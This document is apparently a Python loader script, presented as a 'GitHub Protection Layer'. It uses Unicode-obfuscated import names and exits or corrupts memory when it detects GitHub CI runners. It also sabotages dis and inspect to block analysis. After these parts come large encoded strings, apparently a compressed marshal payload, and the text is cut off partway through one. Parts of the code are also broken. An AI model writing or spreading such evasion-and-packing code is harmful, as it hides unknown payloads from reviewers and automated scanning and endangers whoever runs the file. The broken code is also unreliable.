#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# GitHub Protection Layer
import sys as jʜjᴛɢᴀomqʟɢ
import os as ǫ0dɴu9p40nn
import time as ʏ4ғ1yfj2ᴠᴡ

# Проверка окружения GitHub
def _check_github_environment():
    # Признаки GitHub окружения
    github_indicators = [
        'GITHUB_ACTIONS', 'GITHUB_WORKFLOW', 'GITHUB_RUN_ID',
        'CI', 'RUNNER_DEBUG', 'GITHUB_TOKEN'
    ]
    
    for indicator in github_indicators:
        if indicator in ǫ0dɴu9p40nn.environ:
            return True
    
    # Проверка hostname (GitHub runners)
    try:
        import socket
        hostname = socket.gethostname()
        if 'github' in hostname.lower() or 'runner' in hostname.lower():
            return True
    except:
        pass
    
    # Проверка путей (GitHub workspace)
    cwd = ǫ0dɴu9p40nn.getcwd()
    if 'github' in cwd.lower() or 'runner' in cwd.lower():
        return True
        
    return False

# Анти-декомпиляция защита
def _anti_decompilation():
    # Запутываем стек вызовов
    try:
        raise Exception("Security check")
    except Exception as e:
        frame = e.__traceback__.tb_frame
        while frame:
            frame.f_code = types.CodeType(
                0, 0, 0, 0, 0, b'', (), (), (), '', '', 0, b''
            )
            frame = frame.f_back
    
    # Ломаем стандартные инструменты анализа
    try:
        import dis
        original_dis = dis.dis
        def _broken_dis(*args, **kwargs):
            return "Analysis blocked"
        dis.dis = _broken_dis
    except:
        pass

# Защита от статического анализа
def _static_analysis_protection():
    # Искажаем метаданные
    try:
        import inspect
        original_stack = inspect.stack
        def _fake_stack(*args, **kwargs):
            return [('unknown', 'unknown', 'unknown', 'unknown')]
        inspect.stack = _fake_stack
        
        # Блокируем получение исходного кода
        original_getsource = inspect.getsource
        def _blocked_getsource(*args, **kwargs):
            raise RuntimeError("Source code unavailable")
        inspect.getsource = _blocked_getsource
    except:
        pass

# Проверка при импорте
if _check_github_environment():
    # В GitHub окружении - самоуничтожение
    try:
        # Затираем память
        import ctypes
        ctypes.memset(0, 0, 1024)
    except:
        pass
    jʜjᴛɢᴀomqʟɢ.exit(0)

# Применяем защиты
_anti_decompilation()
_static_analysis_protection()


# Импорты с обфускацией
import base64 as ce43ᴅᴊᴅᴛʙғv
import zlib as ᴍʏᴏ9wᴅɢv5ᴋb 
import marshal as ᴅᴜ07ɢᴋǫᴠt
import sys as ᴏoiyᴊ7oᴄ0rzʀ
import hashlib as ᴘiᴘǫarғᴡjizᴏ
import types as ᴢᴏahqkʏvlbu
import time as ᴠᴀɢ84ᴋᴅʀᴀzʀ
import random as uzmyʙɪɪfwʀᴜǫ
import threading as ᴄmᴍ9mᴊss

# Разделенные данные
buikcdkukl = "0NVUeS9TJyWsA8vUceohUPmrz08XEWpsfnBIVFENa7okDeo5syhgjTaOHCfhdHvx9VLm0NgNvURNbqpw78exSPadCuenmSBTp<lAsIK8qCOwZFNk}y4+OpZ%<7P!bT6u_>n25PfbILx*T0<j;67zVJ^TKd50|aJ;)1)rKjieOj7f=|erS~ScO%o`R5%>J``S&{5fl)BeRW3R|5dI6CwUK?z$9NG;y=Jjx?X557Khs9ydt1jgQry|<ZSaTsu#05l`^&R>MKKW=Fz<+j%Fw1rys(gs8orNAfwVm2*s$+CmpwPaF)XvF=#MbSqSRYpQY}Hf8d}!B?pz$q)@D8ye(#hyr~e|19TinhNKiX<+^nl=nI=hFjBu%Ur<r{|CzlyDLSdm-cu?-tA&2LfVa)}CtgZu*At`e-dBoIKohwI7nv#hXJ)zX1Ro`(N9^?itdKFEZv|&3}-P|-UU{#+l6hdU$9wybB8r%;^D$ISB_w|#8%c2e321P_*Yt(hc{XX|S7UPwC)`#+8m!Q??m`N%0+f}H^`jDCXl9g8w%x^E>DMDJ|_~gBVmq(gh(|!wtA`&QRKQhD&ANq)_&N?_|yX&R#5K5zDcgR@Q>OQKkjLebrMFaI%ekQ^BD)W)<fKms5(-`}Y?}0HpUNC%q0*jl#a>$9hJ`Jvi`0WQsU1h20h;F!R{B)b0@)!CUY{R2dy0kg61f>jzM>Cq!VzhYi1IBkJv|C^R7&)W54FmHw?5xLjoh*H(P)`A)Y(Vv8VAoL}BpSwQ1P}Xs*&e48FCF255%tn#VH9XBejxzR?7KyTmS}FhMYD<!Q4)9z!n+G9^ls|_AVm4w4tE7L#QFL6ufmil1gJ^Z?Cb4MMRwJKt6n7G_C?4Ji@B1keFvvC2%CD#7sI}&Ww#!%i`0JegLiP<K`ABT5bH?ahH+R~0rEMQ63s$*Z28a9DBky_r`GC|T|K{v8c!U9e*|;RT)Us)rNyWf#L96OI1)_b{+O8*trQDmhSxZQIT@aefI|tRmp3w&z*L;o73Bwx3H%GkArH48U#XeQFhxS-H$O_MIi0z_rYr@#q?hXKK|_Y|07cF?yeI*Qy61Zh1M!7Lm*DqQx;}5$1sMu~+6jtO>tD8k+fc&c$ttcYRja|K8#D8KS_!qhX0)CPTdTfK+oOir5a2p0zloDeJZV$7Fz`v_fZB5TH_9>jE<i^@R`AqZID)r|>gIIZl3uZVLtu?=bpSY&Cq?zbFFw>$-Ewg3crvn$mj2W70A{!|JGl*jwNkJDRdt{^<MSoe62?(k@+M8b6AZSSIDo{yCl2&29a5VnUu$6P3;yPT?&Niqvh#~zz1@R_KPU^~`LPvE)^EI?kL#{b_ax0v-Lnse9su*Khel3PObdS)iN<dQoKrr{9k;7H$Q^My+FT*1+on=^zYt7Fnl9v>T9~FV#~{;cbiv*b@B2+pV4d+D5c>(YvD_JDh{%DI`1B7-+*W8qRHUhat;vzisvNy){j=1KKFN(MGn!r6HA%B+HN@SFzd}VEJXfA26~gpO_`G$U8rC^ooA;eH&V0wZ*d;NdI9zl#Z%zH6KkZ2X9KooLc*%s>x|L_Z2Vg+0tP0^0YPT+(u26x9oR}4pvX~$avvIgdvvzrLvjl3DFQWb>TA_*$9sgT-nH{N|%2gnGGx1*pGa&`m61=a1M`sIzzn!`NvkgBUl&ixGD%37tz5GMh^N@xvVLjrz+IH}X;?sR1_d8Oh&2wY=w2`T5A2*JDqh`wCf876n$zKtW>9p!L;#^%y(n}vCwM2@SUH`v&D~*g7g~pu-8bYujn0)%(Q9QW737WnG`-SB&uRMGuGVff9V3WT|wX}yx46Ef^rUC^P`LF8}iXwVNptn>inPj2;`(FqQddW7zo%xAQ*@POSv;8JpI|S3od5dhQC>W7WNU(&f!A%KfyzFUg+om2J3p>Cf14Ez4xRpOy5SbI!(>FwxdG#X2)kT|%-n^lor=)C1mXp<F24wZV<FK(X;Po~PeZ&i_88MF#KkFfJJa-^*85WL1^8MJIk|uD%tWe!gUs|&xQh(S&t(kILk$-Wy{>L*33|$g0rj1F&&w;}yQGx?S8S_SrZr*qc%ZpoY0)YF8?ucr(p2CaMW&mTlsQkRlrawnlwG&YgUiUp=A3)wobR|^|G~gzBtp74YcEi|4v<ge8;e$X!K072~(y$0ab*w9=hu)x?GoCi=UW)&kykE-N!pnBOWrU&6lZS2E?p_+yF%OPV(bEx4q5&GdHFzqicPJd8*+ptb!BEH?BY3`P$|H0&wq9L)23?Yi$A5iZ$T2D4Slz7i-Pz@2Ly<RGi|BfyO5qwslPd@AqiqYF%tRkQ7%EZE!{b=(RkquZ7`{6*05g>wJh6O8T7+S)xBJMta;vFWWOG6D_umx0;X=cj_GAq}+pw`cdLOF+ehDrHj+O|LT0FNv>E|ACsW86B8uRtW>dR_JT+$^86Aqr^;dEY@HQ2{0EgpJjmui=AOiisiohj72kXv~F)qBPb75@*?=axn?GYr;C2Jc26oN=!=;H<ZOyz!abZW`p2aA+p1d2GH{buV{|<&J^xP0y48)<F>*@gxV2)JGa;-F;H;YSghhd_6;bU2bw}_!8T6js+EzZkNqcf)`r&5zI{3KxoVYQr~}u%s=-DEX-tnAId0ACaQAicimqd*Ymk_N#sv{Orj2Y0KI3wM$f+yW1!SB$8yp`%V~cH_Lrv_*m|w1?ZAM8Ja@ysHR`+?Dj`DPj-cm@CFbIZ$}}028fF7*_C<Za0BHS#0h@m{mMTnLyFV_`N*l;g<T}8{RX-n`P56D+*nqq<Q!qiLp|h_Z7)u07LE^FUaHjihS6_wL(3QnZSlmwtxbo-HGKR-OdhdwaA|gA1#nknZ1<%BE$l9Z9B_42m{E0c$EWSmro+dER@n0o7BocWjpE4d!b0x8A5yi{gbPZ^8)nee4h35jRAOzA0>2>M#Q!x(BjO!Q(f$_Ke(SfC51(7FK<m=QzBfxy!3k1@b!{Ts17<>hu`DpY`WhRK;EKCQhO1@^neLl9<G>u&2d8vUj%axac3F5#-BQju0wV7$IFsndWC?uAZDC~=4DDhppttM<DE#&1UnO~u~q)5}oA>iRw{6!Hk3zz#4k2PqW^K5BKSK=7=&m>F*-!D^+SlIed3E};)M-85AkCMW}vnJ+@=Cb>|$zM^FevU)y;gBiczq!702mij(EEEa}RD_I2"
pcliytpcaj = "j?<s2?6;mxOUB#kIJ-WNB;GW<*n@GgNhIww6lM{)5*HFBejigYsez<R+oItAJlcj<z?A|##cNQ5zRv?ux;VsqYPHzz4!ePf?yh#as2)0<3yLVW%6FAXP$#kDWHf-7G{<oL%-*z<P6%59TqZ3@P4EYLJj)J1;6{hN1!wCWDW|iWQ)pY?v}9^38TzCqL9r?q%yRYfZ|1AtY|c>1MiT8-QYzxR15{LAIui2=J<6y$mq+_bECw+W{y`=3cfbj%HyNPx7y4U@hWEpL;3fbt-fF}Dovg}DYtoNoZ3s=T{B#;zWIOD_1^%eotQ%&v8EH0Y3>%IKhEx*o&k3l%p;~L9L3Oc;>1Op$qo!4*Q8E_D&@D?FSprwkx-XQWt~|C@A0Ee1GXKLySa$D3h+ez`{g#%9!L(gN50ZH|@?wMI#&znodGpw~2j|g2UEwl7&|w!#mUNf$uTT%)^A{&%x?I+~U8omNROE8sHD)fw0Py>tk|cL3aBms6Hik|1JdxO%4XTpZ6Cw=83<v(OB)zXK)j)}%_pX`9#QQdnb?qE&Z1xu2WpA_L$jphGi2NnQq@z3~7N&#(tI#%8!17o*dq;>HCX}O(K>vSzN|Q?z1++J%G_`F(k|}7O&vX|w*TsVop$%G^D(M}8M>-Ir(zhZ{wnr|oi+io_@y7GiGFFxBvrHz`BV;V1YQ<vlAV2`oF1aOmgzZFWJeg0b@?ySMXECZiX>SKsswCT3LmY1!`$XMiB@T&pAw*^D<rA`8>4VXHvu4>JSB|=e9PFr|-uI6bk47mV-b0+HSbS0q!>52ZzYR|pv(|=~&?x_X_U=}wsU|8q=cf(mSv7(lUb_3LpexGVh1sqMte$#fLDP874u`q(6jXiLtMTndREMKs)hW~%yJdDc8~8lB+__bOiCABjSwy8@;Lbpt>_s$p>Yv$%P3WP<{4zBFU@OSmt<`+%Y}CNvk}D|3ilDDHAq=e1yfjr4frGVn9J1jVdpv|%%NRRs-Uh~{g%u|Sh7kS9=g~5ccF)E)F{BMC58mdeXqy@mH~s$F@ThqwirM+RE%^KVaVhd^m~_#Tnn70c$?iYOyWBduNh^ig)F}!ibdCyVQ@zOUv=uGLu0pd6FWKAQZr*qisgzlqiXn|J<avK*VQZqW+P}QSl|V6Vq$w4?M0n8Qy^8x<e+pPoEI-c^YI}RTbvh;eNj`s-Skfk_u<(VuNfjrMUio_w7My+I-wpEHxdA5jA1PP#GktP~J@5ZG$^|NUxk|iw364l#H2f2rh%o~cK=%#BQyIfJYIVFV2R&iyt}_+c1!HdOxk0rjJ8;2{Jl%I7fhizBh2f4o_`=rF3FbYk1&wAD$RE``*Ip0&zjx`)gg^6MX+cP3(COcXEc(~jk-;|#dp>9_fK-ySCJ@ojj)SnOOOw2a{e@6TB6vxIrRM?3+VylRZvc?VVXUz1VH6cN;M>|L9|$Pm_gX#hAvlMsg?eS_AXp%4r<emNiPx4_LIK+&ucYzm%-M@m(}vUG0YEegQqe#cLsYAZ4Vc1@xFO?dKhP@NX-0P6CCE`h1fG65ih6Eb`+rC&l)yb7XB`;FAe_+JI^L4M1imc0*O&V(y|-vYgs&R{D>W8K)tI`L-rMxf@_FA-7q$dGv%Z?C@|Z%h8?0acg3XlQLqOd8&7tj>4APubf#l+@K!GIyXJDYWx15``vjeCnjCZfB|G)%*XXyqaoU^TZ7+&DBs(J%`f3Fjt#J<6?NJRc(X+;5FSc?1r@hG)hw5$t($rc?lBKy>9bie-@i54g8GSOTv?UJG6SQMVM_;$r}*q;jkvARaP^;3dVFwIFkW_ktmLh8C;g3UB&SN0jc)bR#EBXI-D2TU7Yd`0gy?8>)P2OIsg%4(fo!q!l){kjXxgHe%x<>Oz0H}q2*^zu@=r)rjsPnrdwZEMQ}ixV?oiYmBWqkJRtGeI1s|7*&->M-wJOC4o{Ny&O|zPatB{+w)%yQ}C_%Jfs4Ln#kE9xVtGSniScjo|QBbO+VA0R1nPqWHBH%$HaF9(T4B<N#?Dn!$fIZcBx_ZQB8sYY?9w-l-k6R!LLK8yFKZPl9g6`Y-vqEt69$0H~M~f@!t0szhQQ^<44<TjzCbQ6(SvrCa!&_(VjwE8-;Ua<Sh{xqs<gn@y8O@`jI_J7m8akPbMu^W|anu;2V1Wcj{kU*0oB1qTf)XeKyB{g?bdYzFF@&AUGRXVk#A%@Qfr<r&M=oa3sF>&)soY|r;|(63*6E)K`NR=vy7#$-rDW?Q`h3U7O|&9ja`K0Od)Je#TX8362pa-3=}q>;O&%5v5w6Eu=3A?UPv>kd;6n}fYsxhCdSGwRrULDy-Y!esDu&2pMQEyfy48{m;tVy*=a{1d{lJN7iAhHe^Lc*ec*#mG%fxUxKbgsxE#jt77He%(+@1c?lY6}iL-ObSxX0}+aK-Yha6oz6Q>soeNt6z)2}lL#%H5uOxKb;i__=v3r#E0|O{;|bZ*{-jJ?b6zsTX10^)7`Ds{X{4Q(ZI_ks@H|cm#<n)Yp$RR!0-te6Oql-@kC~a}9*!Ked#4S>@3AqDpPmLW&A_&0t^LQcIu+-m&)VSnO^0CA;LUFHu*+d!cFQB^4~19!9S7!74dZp$*2oLvG~J_60in;bRk#0tHmM^9AR))FBb{CKBZ4<3k|CC{=d3NT#HJw<Du(Rr`t2ll{6SM7M;f^lhQ%DGgcgW<XP&WH12L><P$1a9D&+Te2IE5LQ}um$t77hn_+ml1b<jF$TXbYiK~0b79Fu8{B*2@W0WogJ(Hu|ol%q&1qV$|!dFL<&2_JVv%S-&OND+Un9%x|bvdCCh^_{dO(w1{No%?`JE>@dCMRwjEkY1P>vDe|v!o?e86Z!$RS#fJtr)4{!6d71;-7t~Zm%aRx1Qrn;K#2hxR^^Y_@1DQL5Sgl|o8-#>K;>G)QiQ(P8DQC-a$9rt^w|c-VH#_3rYLsYS!%~=MzYvn{_FvRV+dOz@7O)R;~nd&`~zgTUeeh5m=Fup&&oOY=CCSFBm9`CgQ6|;Wefz;Yv6U7%e#86Il4yZ?%Y|1Y*f>B1-MT<!;3FxfN@}4yUAi9R_nI<IK9>{8P|3Vu`T9i-R4K`4gMgGNiUGyo6wAj3vl1OaxHqTp`MiuMYdoC(Q}*O<Q^_<ZG!YqR+LV`0E{i1{AxqDp7s!q_LRaS^4qeEHizDdhl$bdT{aLGwh2BYzPsluzMaof" 
icpgwmqyps = "v&p2N|1!Vp(=g%o63INFm))EPT5)-zOtuR<G{gB?U!uH2uExyB$B-7wCrC*CkNDQ4FKfIe5JUFH6Ibq+jzP3n$>t{~srj+IMen3EqpbRN;Z+Vm#`lrQNNQ6XbzmjJ^}>|VP@gXLAM_z_n3bg<6)@T!M=0Ubr_y<fSA_%B$=`kDBgs=9H1A^muV`cxOBJwe`v(bOZBOGPi;CYBR1xI;AA{{-t!N^(7bB8uhB<DhtVltI8JH>1cE~iBrw=Oy=^6z%oehoIRR=rWV7u-AA$S|#!aLudQPLyExm?<2yDuZ9c}j3GOpXF2``{^=v~|=yJ5_)n2|jn5cU>oQo}byFTtMsa9j;Ob8F_EbxWbjJ#pQX47V*>9jMQ%}?^jT?)^M2<0*R<|){YZk<yB`p+;bg|ysV<1EP>;t6Q$#`#LAgYpc6a_|B0Xa%Cmyom*!_n)wn;(Z(hkzThgBIPxEb)N_YMIPjU2ash5}$d($!SKKR)m=e}e>Bt|JtaAHG|D+NRRzULLE8D=wxXRJ6l@lcUed>4`a$J>2=*pGLQoIn^fHb?SZ#BoB3z!`GWx&)pcIG(%cpgbsUi8=#j<<Z8--E9lWLSEjBt40wO6&I9hJ_Hi#+!Vv%fxOr2=Ae2&vV=oief==X!5_wO1VCw(I^Y7i06o^a2Zqrh51!8pqVbDraecAYWKQxxVDK0Z)CW6?O;#1fO;(hIfFi<iDF`wflS)YzTvm4t46~RKmo{}I-gpGb?{d*1#wzP2&v!iLM6_cU?5jqD<>|n=eZ!KWtfKB^>t0YBB1lL@H{#6BG&2l<qud2#x<J|TJJUdl6%#2AsV=F(7S76t`1Hq_^!AD6f(C}cRKF8Wm$9=AH$tCbtCu>PJOFWm+E-@`NGXO`o@tKu7Nx!x-#hDV+^W?PwFn31<TEmDo!Jqt^X5b}l<T8|Yu+0u)AS&36`MP)<}jS>0c{9cgEAWyx9oEe%RL@KeoPuXZI$02V3hT%Hvxch;h-pF$lXaox*S3hzEA3gCz03f_IO}G9_KqCalU|K9Jq|Ny`HW}mW<O>iNxM_u4~PteDY5`T=#N86cQ%eNN0x6@N0#J>6aYi(S?^DH@)Bl3fv{zIqJ#mNW>#4dUCcM-%#q4SH*@_$EU2g(V>2e6AfUtvY0@~FL{_n%iR_$*rsXTMO=qr01MXUiFbbC@6cL3L1FfyR<@-nQ#goRFq5~G5S5nDkewM7T(c)pH*|RHYkuC&e7~yXP(Ay0?famgH^t^r=Dv+Gauk$)-u=X{5GfA)q%q7+!vUG?tSuYnO)RsLH+6F@P<+^I0*=l+axtSw7$X|$!ukI(spx5|(X5aA<`v*t4vz(Y+>Y8O*>s>gIRAd;Ae2G8WC8eIgY<4UJ!5p*s^}3^q@U*O(3h!%r8~QlIqUEKQ8UBrVYjr~Bt~l{c(YXIh9xw#f7ZJ=ZiB2FOG$Xse124FVj!2d7w7YZkMU|38TMoWtqqgDh$tDw$*&H}Yj?Ss$Fl4)ae9uJ8Zgl$-=jP+{j<gC$gu!{$2`{!MLlWZd1+HsPe>#d7>MtTX*J9CjC>PGIl6eYSONh2T>MX&v8xqh&VeCMSkh{cQ_8RG&nIxiYdd@AU@;rt8l#0E)v*ieD%k<o4<8QdL%<0uxMFq0UYKfMOuMgXsG8^m%So#Im=366i@q^&hP$B{yLeP!aM=G&1$(r(+D0zg&uzclfx?C?Gftb{e1r8}LL)-)b?{s`g@};(+!%k01U=SUu&13`q&pmr15BUUNI6B9E9N$g&J}fvirBO^e;LgGxuj4rIjy+Nnk_l6V2dtR$%7?MZqmq3G75l@*FP5Q|FZ3uftTBBnxTW};_Wz(Pg#RQLmsxe@hr4noP^|HVR0zApOIR%=YlS67?#`cu)n0^kn1#v>2BlUcU4TAPRRw{aN#7Y!JtKf@+Z(WKXg8gkb;*yYUW=YRE1JTUb>ShkBAew{J2m(6~-X83`Gj#70<#b>5-|_fV#c5aL;xqd6$Ute_!QMcMy~ClM(+OJk;Gjef4P{*6PuZDP(i&C)%(5&K$Z{;j~pGuTwTc+G083k@|o?i#dVTFY_1&8wZ`Jdz)MXA&O=)7Xn1YL`|y)4K(2kQ_NCdEUCxr=WkG?Rq^*pvLY_vE$W#)cVNYk7j27Tcr6_vQp;6o!8CJ=lS-YSC@R6srzHWpXM`pwBhps*s%AEJKC~WMEuSHjWFWf?x5+f9g@>S2v6`yplQl&-OXp5TVcN9b0!2frAkNhx9hC|8_qH`hOgj9;kdYYK*J)Tb^q{7}<uUDDKDy_G50HC|=aih0IZe|xMcViXx0Mu-(|D?-*q?A9J^xTrimbyHougSj;<fu0-~-UNQS_Yk9*+(k#EPdrk}o8r=PXw&rJJc$FNCiu&g!)ikPnIEo_1kd@Fsm|eeV3o%nkPIpYg4G@XX_@nrXB=(F9#52`Zo@So$ZBq-`nVqnM}AIt7dyh@CXla2B2S9R#nAW!xbOae*C>!tgSH+&|@$DTgkQ&RU+h5D;FDl9lby`u2d7FI&DNPkbYo;`~n#B4~;5<_U><KzaRqP9pR19rQwqy@>6?mm_G<hge0oaGY8bVS0UBcMn{maEsuE_S{EgYB6~d716(6q?+nckd|(8N@rIe+`LIw$VHSv$74b9m|U16eMgH`@4x=4|JsHySwv#~?L`-YKjdADHRo`--fBh8x6x-zK%J!!=RL~n#5~=fIWW%2I~?rjk{+WhZ8DdmCj5|hvSEzfyOW;it&kFJuRik0_6Yi^)=ps_P6}r;hiV0;RLd&_njMMLgne2&Bg)NrwCU}~L|JhPzDILts>e~o3_cBIUA7=*sn&j)+3X{5d0e6l>uQ?m%WJseVCfoTQT+{}>u?MbzEdW(h(F?Kcd0z0OQz+1Z_-MwpIUjn<{rm=AIva}(+gf~rW@K2_f61fWl!6;0+xSBAnbK?CbiEQFULmw+ZK0}EAIw|wX2fgkCxp`V7c9dPM$T?DcV2&Efmgq_h(+lLabJ)kAQvMVb*2IKr6$C=3eroCxkhD>*$<?3=|;J$5434260wI{pj=Lio5ubvzNz4|0DA2pme?c%C{<L=(y%E3=2~6lN<fr4SR4%2p#Z&@KCmPk?Wsx_{@zvSt!jJbh+rbhmS&%y7%VrhxupFI()p?4_va*ZEIx2U^2sizSu3SluRJx=C$61g_lCGYbmUPeFZ-@(_%dwq)YT%7&dw|"
iogmfhmznc = "b_9$(bFB?;&-ZB>)_S;rfBOJ@8|%&HGT8x)LqS`#qI|059mve&8uE1c3Jp0xr3*mgD{kJt{WYSha2I}0k(=%3kmnc?69;_%z7l2e=fwtKHE3S%_}s@MIh_WsVO=T^qcNE2=)gG9qn@_1zU>}zt?*!DN>&kGe&6QK=@GPd%+H&|1k2(9DIn;oej>)_hYzo}ZWPddr@(=&O!Thd@Lf66rBwJu^zx%|lsc#3v%HK?7U!#*4oZJ(AQIa0ZV4wX8Y%UIt%v)J`gba1Q)?iL+bvO)^Zes9(GfzCIWy^U(l1v3LGLoJK>yBmNRe?+U;Qm<ZHhlrg*O>>`}09;;`BXJ?Eg#>yt~V^6aA6fy?UT(jW`fA1LMJZn4<7`wrYRp9n-J)oZgXm?$;EuSz*57I2)Meq5|iAhne!&p}G_!`rU9a2CNNBR24jXR^aWm3U{6xBqOAb$R#sm(~4V!ZOaYiKiU!Tckw~&DQTr+ol<y@)-jN-*;xK0tk=Mwz$Lxl6%V1;pjnmpX>heJD#budvF3S(!O#8pzwphukpqeB-YVX7{opZ2hxz5QJ{&wF-?nzG;@yLlB6Wa081~wK%FYqB)iVf!S?jdPmfc$-*$Ov*E_sZvcF=H+)nQkNfyg|&q%Jqmz?02@)ssi8GhkOVS7alnbep{L{;4-hYrUN((kc*kW200PK}%;ez{prMKr}F0i>O(R@ttI=OdQZ&2vRbAWT5U0FdCK<hNy*f2!`XGwnx!laRwmDwMj$5>|iJwfF@c#)HmHnuo>F6PPVa_U&Pi)zeI?>xY9(JRm_R^l$7PK%AdH1>3Z)5Qt`>m2>Hs-YX+;X94{%f&twPAkzzL`md?w`p=kr0BpG_SJ+`@jLJ=hXr?#G{@p!<okq!D)K54aXaTcFmI?W>COo7brM2Xtf(}-|1X`7>nq5v736W#Xp>PoTnU4h1N)AHdkSZQ>n)j1it!*D!#QG$%&xsn)_+NstnjW51hS3_)|ew!<CIN~?tiH7`dT&;j`zveg*w~X`-65$Uv14!g6gJfacPKJb>!L0ylc==#x0(mvTwAjUNl2$Q^FBk4DZ_RzIH|5S6ao@9>@bZ!S<t!ATatG;WoLd?0^VqRMfZf1N;WkfqZZ_a}9FYS<wMt;k7X|^Q;c@<^SG@|sXD%C826}x+7^U694Ht$K><4C3B|Yst8^?={oSjP#CtNs{jFQKTd%OfI3G|ZMFhd1K&9eiV%=X5_3McI4xzq_OX)FBUu{zV8naAn48u*tiWEC4WRazrj(TM{{Z=MB;q{b8%(DJ+ol86(&wIa0d_e<61B&Lqp4v%d1!6N-Kn1v<b7EE<<M}_6R0u!tuJ8DDPsq=FNZ<k(MEaqa}zK)!wp=O2ko8A02RE_)<*m}+Qw8>tA`Hr0}^p{~4jXgCZ1=%TBfGp+!#sT2*3xA{Uh&n~us9v7qbZ4VTQgfH&O1OOQC)Y+VCa+~ROMoEW%^$$JDTU4$;`)AtZPFe=!A6`RTr#c*EAXFE9`T7&C7ZtDr?Lw_PqTo6cv3B8T^Ey{3_Rd<-Lph$-lqr5#_I7Rm2My$!Bj2_j&YD*l`Jz6XZxA!jS^y7!Rtpa`?||(RJAs}khUSn*W=WzSw;0*0>J9=V{=#u7o<}B_4zvRR3Gv|iA=Lj?Pmwo-tYT!5V7`<B*a==IuT?9nfpD?1I2UM8b){6wY{m3t8FyI;c|6jvwX)-?Ym5|qAq#T7ztkia^*D=D)ib`N#ZA2(^WT3Lx(`}oVJ3HE<<Y3u!A8PD=$1kchJNBJ5I`t_%muK2)2wL8d)XZ|M)jCvR+;NN^QTo9xomRj!|la>?<+ue<nmoQSjyWXDluk`PC04b5V)u=duD>y?p60k(bpfK~`UmySocZd9($LwwUU-`fD)KeBSq<=gv9VszkrLTHqO6t;PN67PAtxu$4T~nj_qv*P2I2w^)Ux-;hfx;Oma&3qpwW-%j<?w=etzC1SP#7)8MQ%Z$igTmO4cKOb1J$CA%rhb>Tt9)|rpLp#aV99zRUR_+9k+L1B*AiS_Fga0K6BN1o9ddw~i&fws{x^b2$<4j(R`gWI`5HWYthbXz_IhoSS-mvYgMf$Jd^(htVSaMmO6nO_{gp*S|jEAH9brsK53yPuH?1H_IhOx1Mie|nMZyAEydbzObzbzqoTH#C@aP|N^JWpYX!io|Y)EbaZS1JVZ4=SbLSq7JOu;dHIbfLG!CXjcQF%#*BydE*B!%<)ng>*e{iiMNOt<$_z0a!D4aDu}=?p&Wk9Vf~qU9>aik(Gg~UYDK}X2G+3;`j5lCI~m6OR{$lBabq)z;IrNvtz2>?{yS<l51Q^!`yb$W@kjcpW}+EZZuwQ$9UHTWEavVEkF%%(raLXRDV056c3Hm5(!jIf)BiCsE>3}+jNo1sw}k#t(h6^J9YYyGNNz&ff;6vQ4eLymtLKw_Y*km3F|A)ICP&p^`f9K>}|ex9D&xsjvSF=#V5KT<E|u|`hc(nx~w*lBi^~e)JLNCDX)BJBDav;rt4?#;s91hiZqWa%_VGG1b;%0rw)0$t5<Tdy30&izcqsgJFtPMmv4{>ZBnhe6YHBr6Mq7ys&;hC@gj5EkF$|&LUSi<`42^9#J^&Y>ACdQ6)tn1pm>vsyDbL1qyqb`8siZQS*_yEygtWV`))Vl)2IH65W7U&<+>t(_7tJ|o170d17pEBAi1wFP=}P3E?H@A5OjIYQ|X~2RI#F{FU4BX+6z6m2rV@PiN~+TQnF?z2=!YK5FR#0LA?83scMTUOEmd!H4`g#5YEfXRcO9LPnQ!&`*B>tQv-Kg2@>JcjHp2+D_61zO>0h1Z*C#*C8zG!ZS+)w1ZUMJX+jJ(G?cF0H$$3l5lqYMCO0ADljyo27XH>NQq0XQFbF#tGGWU3gR^7W`?~{AG3w}FQGhTLX~0jF2j%Mx!yP;^s~)Zcg!q8aafXdacRv}t^;yYmUv9BsgLl3Vhp9rueTxnTmZa{Lrz;!pJE+^3P17EIHG&Rjb;lsXmp!sRdkVnKJUX=gZdSGQn_Iiw71@1Z@LkYSA9zLo_pI24s$^ENF<rieq|t~YMTd-g`DqK|!Zx6ZVW#yP)v8D4+!07D@xl|&pcc{EM4TR2uD9en1DA>V6&P#O`!RLiCjrFj!#7>G9nC$%@hUcheT+>wT70wevvb{bCngtu$`&`eV%<!s^e*r0gv<X}zPsIcAvCrx44l{T"
dtbrimpbhb = "V?2xvLY{lCh7FBE=%i!7m)o>NF{jO45Yw>_X8J5uDXqrvfo_3nVxde7wy$b%tq-#uVV{g2mjzxnDl?G0GikgM478Y6!alX{^PpM!;S>FgiT-uqh@ln>KL>7_`5Dtybla!<FhSNs<{#JKuhbFkx^Ru1HVwYI>Kh{~+3=^(ypC6U4|<Zr=Q5=~8eXSqf&K4L$&JTxKlV6~)q@L-)^%sSfv>oc&n4&^zPFz~-A`$xGTHE<d9a8?AoJV2`7q0ayU?h^az<oHYb&SW<STPFrjQZxX(h=(e6ARvrVOyizQsb0L%j(D6*-z9o)g>Pezix$+eGt-m?RB4^Md4D4~#P}qNy6af4wu76;T@2SiFAC4U#w#pKBmMamR*m%6N7P*;V^mqkmI91#@zz5w^btOaKM-Gvf5Sbdp{IuRkQJ1CsLK%NOkDR6a4bE~-zZJGzFA1p!H{_Sy<}(?zOB_y!XDkf?9*;tl+4piPR1iW$RYHE>vr!XP6u1tQMgJ%(l(^YJAAsXP@!4C{+@##BKe_0<O=t%U>d=nKx<#4<$VGo1%Imy%LV5oP+x59Z_pTXJcZKAVri5JZj{o(LD0%586U5W~T}u9?(7`*c5E79F<}KLT&m@B9tOfG|En_-+KP+^90YGy&CM<9uQ~3y~tues3IJBVzE!My>%`IL3hEQ4kE8P4{x#N9?fbkI!xvei2&#2pJa&mzuPA){FO_6`YWlmaheBg6nBn+cQn5<b|pQD9j~y0ql9Mth*a1jXJeKI@oyy5wc2bO)f=}e~&j{CwNfx_4q}|^d8w&O&fgC!j?_I<vJ-tRb+nx>=^9_bY^)MMnsCgUHMx&o^F}J1E8n}WQk|ft_&a;j`Yu}cEwHP)i2h?VqEi)w@H=#f686vZeV90#F~U(d*m}GQ`6B=s2t)m8$TsHLiRH<q|;Zltqf@yBY2Lpn9~%6L@OZ-V!Hpuub~EOIc~CZv*r&Z-M~=Rd)!|D*<nqYs2MugORb2pvIUtGOhZwd4E(^rY)qwiza7nO00H-j&*ooLBnfEB&5X;P`4K4k7=5+me2fCzz|(BB{dre%U9Q_83oRb^pW(H;QoL)0zB6@0nh=p*A#nj!hO~fu8w@?TI}vO({tcmuXz6s+L80aaHwjEVcjYv{WLkT-8&<%Mq{8Gfn^t3Y->&%7YI$FClI;U<M>T$AG(J^ADTL